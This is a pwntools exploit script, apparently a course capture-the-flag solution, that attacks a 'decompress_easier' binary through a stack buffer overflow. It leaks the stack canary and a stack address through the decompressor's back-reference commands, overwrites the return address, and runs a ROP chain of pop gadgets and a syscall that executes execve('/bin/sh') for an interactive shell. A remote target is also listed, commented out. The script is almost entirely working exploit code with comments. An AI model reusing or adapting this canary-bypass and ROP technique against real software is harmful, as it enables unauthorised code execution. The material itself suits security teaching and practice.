# BSK* - task 3 (binary exploitation)

# Flag: BSK{N0w_7ry_tH3_H4rd3R_V3R810n}
# Vulnerability: stack buffer overflow + we can read anything that's before the buffer.

from pwn import *

buf_size = 1024
padding = 8

execve = 0x3b       # syscall number

# ROPgadget --binary ./decompress_easier > gadgets
pop_rax = 0x449467  # grep ": pop rax ; ret" gadgets
pop_rdi = 0x4018c2  # grep ": pop rdi ; ret" gadgets
pop_rsi = 0x40f38e  # grep ": pop rsi ; ret" gadgets
pop_rdx = 0x4017cf  # grep ": pop rdx ; ret" gadgets
syscall = 0x4012d3  # grep ": syscall" gadgets

# Creates commands for the decompressor.
def cmd(length, dist):
    return p16(length) + p16(dist)

# Connect to the remote host...
# r = remote('mim2022.tailcall.net', 30004)
# ... or exploit application locally.
r = process('./decompress_easier')

# Receive initial message ("Very cool...").
r.recvline()

# Fill 0x400 bytes of buffer and 8 bytes of padding with "/bin/sh\0" strings.
# Nullbyte at the end is the first byte of canary.
fill_buf_and_padding = cmd(0x409, 0x0)
r.send(fill_buf_and_padding)
bin_sh = b'/bin/sh\0' * round((buf_size + padding) / 8) + b'\x00'
r.send(bin_sh)

# Copy 7 bytes starting from the one that is 0x510 bytes before current bufpos (0x107 before buf).
# I found it by printing what's before buf twice and diff-ing those outputs.
# Seven different bytes were 0x107 bytes before buf.
copy_canary = cmd(0x7, 0x510)
r.send(copy_canary)

# Overwrite saved caller rbp with anything.
overwrite_saved_rbp = cmd(0x8, 0x0)
r.send(overwrite_saved_rbp)
new_rbp = b'a' * 8
r.send(new_rbp)

# Overwrite return address with the address of the beginning of ROP chain.
overwrite_return_address = cmd(0x19, 0x0)
r.send(overwrite_return_address)
rop_chain1 = ( 
    p64(pop_rax) +  # pop rax ; ret
    p64(execve) +   # execve syscall number
    p64(pop_rdi) +  # pop rdi ; ret
    b'\x00'         # first byte of "/bin/sh" string address
)
r.send(rop_chain1)

# Copy 7 bytes starting from the one that is 0x448 bytes before current bufpos (0x17 before buf).
# With gdb I found that buf has address 0x30 higher than initial rbp value.
# I printed what's before buf and found an address (starting 0x18 bytes byfore buf),
# that is a little lower than the end of buffer.
# I changed its least significant byte to 0x0 to align it to 8 bytes.
# Now we are sure that it points to one of the "/bin/sh" strings in the buffer. 
get_bin_sh_addr = cmd(0x7, 0x448)
r.send(get_bin_sh_addr)

# Continue ROP chain.
continue_rop_chain = cmd(0x28, 0x0)
r.send(continue_rop_chain)
rop_chain2 = (
    p64(pop_rsi) +  # pop rsi ; ret
    p64(0) +        # rsi <= 0 (argv = NULL)
    p64(pop_rdx) +  # pop rdx ; ret
    p64(0) +        # rdx <= 0 (envp = NULL)
    p64(syscall)    # execve("/bin/sh", NULL, NULL)
)
r.send(rop_chain2)

# Exit from the loop.
exit_loop = cmd(0x0, 0x0)
r.send(exit_loop)

# Receive overwritten buffer.
buf = r.recv()

# Activate interactive mode - now we have access to the shell.
r.interactive()
